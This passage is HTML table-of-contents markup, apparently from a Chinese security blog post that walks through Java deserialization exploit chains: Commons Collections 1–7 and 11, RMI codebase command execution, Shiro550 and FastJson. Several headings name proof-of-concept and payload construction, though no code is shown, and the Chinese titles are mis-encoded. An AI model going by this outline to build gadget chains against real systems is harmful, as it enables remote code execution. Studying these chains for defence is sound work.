AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88POC"><span class="toc-number">3.2.2.8.</span> <span class="toc-text">æœ€ç»ˆPOC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap%E7%89%88%E6%9C%AC-POC%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B-CommonsCollections-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">LazyMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹(CommonsCollections 1)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intro-1"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload%E6%9E%84%E9%80%A0"><span class="toc-number">3.2.3.2.</span> <span class="toc-text">Payloadæ„é€ </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap%E7%89%88%E6%9C%AC-POC%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B%EF%BC%88CommonsCollections-5%EF%BC%89"><span class="toc-number">3.2.4.</span> <span class="toc-text">LazyMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹ï¼ˆCommonsCollections 5ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intro-2"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%E5%88%B0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A"><span class="toc-number">3.2.4.2.</span> <span class="toc-text">ç¬¬ä¸€æ­¥åˆ°ç¬¬ä¸‰æ­¥ï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9ALazyMap-get"><span class="toc-number">3.2.4.3.</span> <span class="toc-text">ç¬¬å››æ­¥ï¼šLazyMap - get()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9ATiedMapEntry-getValue"><span class="toc-number">3.2.4.4.</span> <span class="toc-text">ç¬¬äº”æ­¥ï¼šTiedMapEntry.getValue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9ATiedMapEntry-toString"><span class="toc-number">3.2.4.5.</span> <span class="toc-text">ç¬¬å…­æ­¥ï¼šTiedMapEntry.toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9ABadAttributeValueExpException"><span class="toc-number">3.2.4.6.</span> <span class="toc-text">ç¬¬ä¸ƒæ­¥ï¼šBadAttributeValueExpException</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88POC-1"><span class="toc-number">3.2.4.7.</span> <span class="toc-text">æœ€ç»ˆPOC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">3.2.5.</span> <span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-2"><span class="toc-number">3.3.</span> <span class="toc-text">Commons Collections 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%BC%94%E7%A4%BA"><span class="toc-number">3.3.2.</span> <span class="toc-text">å¤ç°æ¼”ç¤º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.3.3.</span> <span class="toc-text">å‰ç½®çŸ¥è¯†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CommonsCollections-2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%8E%9F%E7%90%86"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">CommonsCollections 2 åˆ©ç”¨é“¾åŸç†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Javassist%E7%94%9F%E6%88%90%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84Class"><span class="toc-number">3.3.3.2.</span> <span class="toc-text">Javassistç”Ÿæˆæ‰§è¡Œå‘½ä»¤çš„Class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClassLoader%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">3.3.3.3.</span> <span class="toc-text">ClassLoaderåŠ è½½å­—èŠ‚ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplateImpl%E7%B1%BB%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.3.3.4.</span> <span class="toc-text">TemplateImplç±»åŠå…¶åˆ©ç”¨é“¾</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.3.3.4.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#defineTransletClasses"><span class="toc-number">3.3.3.4.2.</span> <span class="toc-text">defineTransletClasses</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#defineClass"><span class="toc-number">3.3.3.4.3.</span> <span class="toc-text">defineClass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getTransletInstance"><span class="toc-number">3.3.3.4.4.</span> <span class="toc-text">getTransletInstance()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#newTransformer"><span class="toc-number">3.3.3.4.5.</span> <span class="toc-text">newTransformer()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getOutputProperties"><span class="toc-number">3.3.3.4.6.</span> <span class="toc-text">getOutputProperties()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.3.3.4.7.</span> <span class="toc-text">å®Œæ•´åˆ©ç”¨é“¾</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections-2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.3.4.</span> <span class="toc-text">CommonsCollections 2 åˆ©ç”¨é“¾åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformingComparator"><span class="toc-number">3.3.4.1.</span> <span class="toc-text">TransformingComparator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InvokerTransformer"><span class="toc-number">3.3.4.2.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PriorityQueue"><span class="toc-number">3.3.4.3.</span> <span class="toc-text">PriorityQueue</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#heapify"><span class="toc-number">3.3.4.3.1.</span> <span class="toc-text">heapify()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shiftDown"><span class="toc-number">3.3.4.3.2.</span> <span class="toc-text">shiftDown</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload%E6%9E%84%E9%80%A0-1"><span class="toc-number">3.3.5.</span> <span class="toc-text">Payloadæ„é€ </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-number">3.3.6.</span> <span class="toc-text">å‡ ä¸ªé—®é¢˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-1"><span class="toc-number">3.3.7.</span> <span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-3"><span class="toc-number">3.4.</span> <span class="toc-text">Commons Collections 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2"><span class="toc-number">3.4.1.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%BC%94%E7%A4%BA-1"><span class="toc-number">3.4.2.</span> <span class="toc-text">å¤ç°æ¼”ç¤º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Commons-Collections-3-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.4.3.</span> <span class="toc-text">Commons Collections 3 åˆ©ç”¨é“¾åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-amp-javassist"><span class="toc-number">3.4.3.1.</span> <span class="toc-text">TemplatesImpl &amp; javassist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TrAXFilter"><span class="toc-number">3.4.3.2.</span> <span class="toc-text">TrAXFilter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9AInvokerTransformer"><span class="toc-number">3.4.3.3.</span> <span class="toc-text">æ–¹æ³•ä¸€ï¼šInvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9AInstantiateTransformer"><span class="toc-number">3.4.3.4.</span> <span class="toc-text">æ–¹æ³•äºŒï¼šInstantiateTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ChainedTransformer"><span class="toc-number">3.4.3.5.</span> <span class="toc-text">ChainedTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ConstantTransformer"><span class="toc-number">3.4.3.6.</span> <span class="toc-text">ConstantTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap"><span class="toc-number">3.4.3.7.</span> <span class="toc-text">LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">3.4.3.8.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-InvocationHandler-amp-AnnotationInvocationHandler"><span class="toc-number">3.4.3.9.</span> <span class="toc-text">åŠ¨æ€ä»£ç† - InvocationHandler &amp; AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9"><span class="toc-number">3.4.3.10.</span> <span class="toc-text">ååºåˆ—åŒ–ç‚¹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload%E6%9E%84%E9%80%A0-2"><span class="toc-number">3.4.4.</span> <span class="toc-text">Payloadæ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-InvokerTransformer"><span class="toc-number">3.4.4.1.</span> <span class="toc-text">æ–¹æ³•ä¸€ InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-InstantiateTransformer"><span class="toc-number">3.4.4.2.</span> <span class="toc-text">æ–¹æ³•äºŒ InstantiateTransformer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.4.5.</span> <span class="toc-text">æ€»ç»“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-2"><span class="toc-number">3.4.6.</span> <span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-4"><span class="toc-number">3.5.</span> <span class="toc-text">Commons Collections 4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-3"><span class="toc-number">3.5.1.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">3.5.2.</span> <span class="toc-text">åˆ©ç”¨é“¾æ„é€ </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%9E%84%E9%80%A0"><span class="toc-number">3.5.3.</span> <span class="toc-text">payloadæ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">3.5.3.1.</span> <span class="toc-text">æ–¹æ³•ä¸€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.5.3.2.</span> <span class="toc-text">æ–¹æ³•äºŒ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">3.5.4.</span> <span class="toc-text">æ€»ç»“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-3"><span class="toc-number">3.5.5.</span> <span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-5"><span class="toc-number">3.6.</span> <span class="toc-text">Commons Collections 5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-4"><span class="toc-number">3.6.1.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-1"><span class="toc-number">3.6.2.</span> <span class="toc-text">åˆ©ç”¨é“¾æ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer"><span class="toc-number">3.6.2.1.</span> <span class="toc-text">ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap-1"><span class="toc-number">3.6.2.2.</span> <span class="toc-text">LazyMap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-6"><span class="toc-number">3.7.</span> <span class="toc-text">Commons Collections 6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-5"><span class="toc-number">3.7.1.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-2"><span class="toc-number">3.7.2.</span> <span class="toc-text">åˆ©ç”¨é“¾æ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-number">3.7.2.1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-hashCode"><span class="toc-number">3.7.2.2.</span> <span class="toc-text">TiedMapEntry.hashCode()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap-hash"><span class="toc-number">3.7.2.3.</span> <span class="toc-text">HashMap.hash()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8hash-%E5%A4%84%E4%B8%80%EF%BC%88%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%89%EF%BC%9A"><span class="toc-number">3.7.2.4.</span> <span class="toc-text">è°ƒç”¨hash()å¤„ä¸€ï¼ˆæ–¹æ³•ä¸€ï¼‰ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HashMap-putForCreate-amp-HashMap-readObject"><span class="toc-number">3.7.2.4.1.</span> <span class="toc-text">HashMap.putForCreate() &amp; HashMap.readObject()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HashMap-put-%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">3.7.2.4.2.</span> <span class="toc-text">HashMap.put()çš„é—®é¢˜</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0"><span class="toc-number">3.7.2.4.3.</span> <span class="toc-text">POCæ„é€ </span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8hash-%E5%A4%84%E4%BA%8C%EF%BC%88%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%89%EF%BC%9A"><span class="toc-number">3.7.2.5.</span> <span class="toc-text">è°ƒç”¨hash()å¤„äºŒï¼ˆæ–¹æ³•äºŒï¼‰ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HashSet"><span class="toc-number">3.7.2.5.1.</span> <span class="toc-text">HashSet</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HashSet-readObject"><span class="toc-number">3.7.2.5.2.</span> <span class="toc-text">HashSet.readObject()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HashSet-add"><span class="toc-number">3.7.2.5.3.</span> <span class="toc-text">HashSet.add()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0-1"><span class="toc-number">3.7.2.5.4.</span> <span class="toc-text">POCæ„é€ </span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">3.7.3.</span> <span class="toc-text">æ€»ç»“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-4"><span class="toc-number">3.7.4.</span> <span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-7"><span class="toc-number">3.8.</span> <span class="toc-text">Commons Collections 7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-6"><span class="toc-number">3.8.1.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-3"><span class="toc-number">3.8.2.</span> <span class="toc-text">åˆ©ç”¨é“¾æ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-2"><span class="toc-number">3.8.2.1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AbstractMap-equals"><span class="toc-number">3.8.2.2.</span> <span class="toc-text">AbstractMap.equals()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashtable-reconstitutionPut"><span class="toc-number">3.8.2.3.</span> <span class="toc-text">Hashtable.reconstitutionPut()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashtable-readObject"><span class="toc-number">3.8.2.4.</span> <span class="toc-text">Hashtable.readObject()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AALazyMap"><span class="toc-number">3.8.2.5.</span> <span class="toc-text">ä¸¤ä¸ªLazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E6%A0%B7%E7%9A%84hash"><span class="toc-number">3.8.2.6.</span> <span class="toc-text">ä¸€æ ·çš„hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fake-Transformer"><span class="toc-number">3.8.2.7.</span> <span class="toc-text">Fake Transformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FakeTransformer%E5%BC%95%E5%8F%91%E7%9A%84LazyMap%E9%97%AE%E9%A2%98"><span class="toc-number">3.8.2.8.</span> <span class="toc-text">FakeTransformerå¼•å‘çš„LazyMapé—®é¢˜</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0-2"><span class="toc-number">3.8.3.</span> <span class="toc-text">POCæ„é€ </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-5"><span class="toc-number">3.8.4.</span> <span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-11"><span class="toc-number">3.9.</span> <span class="toc-text">Commons Collections 11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-3"><span class="toc-number">3.9.1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-7"><span class="toc-number">3.9.2.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.9.3.</span> <span class="toc-text">åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fclass%E5%AD%97%E8%8A%82%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-number">3.9.3.1.</span> <span class="toc-text">æ¶æ„classå­—èŠ‚ç ç¼–å†™</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8Fclass"><span class="toc-number">3.9.3.2.</span> <span class="toc-text">TemplatesImplåŠ è½½æ¶æ„class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InvokerTransformer-1"><span class="toc-number">3.9.3.3.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap-2"><span class="toc-number">3.9.3.4.</span> <span class="toc-text">LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry"><span class="toc-number">3.9.3.5.</span> <span class="toc-text">TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap"><span class="toc-number">3.9.3.6.</span> <span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B9%E5%86%99InvokerTransformer"><span class="toc-number">3.9.3.7.</span> <span class="toc-text">æ”¹å†™InvokerTransformer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0-3"><span class="toc-number">3.9.4.</span> <span class="toc-text">POCæ„é€ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">3.10.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">RMIååºåˆ—åŒ–æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">RMIå‰ç½®çŸ¥è¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Codebase%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">Codebaseè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-4"><span class="toc-number">4.2.1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.2.2.</span> <span class="toc-text">æ¼æ´å¤ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E6%96%B9"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">è¢«æ”»å‡»æ–¹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">æ”»å‡»æ–¹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Policy%E9%85%8D%E7%BD%AE"><span class="toc-number">4.2.2.3.</span> <span class="toc-text">Policyé…ç½®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="toc-number">4.2.2.4.</span> <span class="toc-text">ç¯å¢ƒæ¨¡æ‹Ÿ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-6"><span class="toc-number">4.2.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97"><span class="toc-number">5.</span> <span class="toc-text">Shiroååºåˆ—åŒ–æ¼æ´ç³»åˆ—</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.1.</span> <span class="toc-text">Shiro550ååºåˆ—åŒ–æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-8"><span class="toc-number">5.1.1.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">5.1.2.</span> <span class="toc-text">ååºåˆ—åŒ–è§¦å‘æµç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A5%E6%89%8B%E7%82%B9"><span class="toc-number">5.1.2.1.</span> <span class="toc-text">å…¥æ‰‹ç‚¹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RememberMe%E7%94%9F%E6%88%90"><span class="toc-number">5.1.2.2.</span> <span class="toc-text">RememberMeç”Ÿæˆ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RememberMe%E8%A7%A3%E5%AF%86"><span class="toc-number">5.1.2.3.</span> <span class="toc-text">RememberMeè§£å¯†</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8APOC"><span class="toc-number">5.1.3.</span> <span class="toc-text">æ¼æ´åˆ©ç”¨åŠPOC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-7"><span class="toc-number">5.1.4.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97"><span class="toc-number">6.</span> <span class="toc-text">FastJsonååºåˆ—åŒ–æ¼æ´ç³»åˆ—</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-5"><span class="toc-number">6.1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">Fastjsonçš„åŸºç¡€ä½¿ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-number">6.2.1.</span> <span class="toc-text">åœºæ™¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-9"><span class="toc-number">6.2.2.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E5%AF%B9%E8%B1%A1%E8%BD%AC%E5%8C%96%E4%B8%BAjson%E6%A0%BC%E5%BC%8F"><span class="toc-number">6.2.3.</span> <span class="toc-text">å°†å¯¹è±¡è½¬åŒ–ä¸ºjsonæ ¼å¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86json%E6%A0%BC%E5%BC%8F%E8%BD%AC%E5%8C%96%E4%B8%BA%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.2.4.</span> <span class="toc-text">å°†jsonæ ¼å¼è½¬åŒ–ä¸ºå¯¹è±¡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 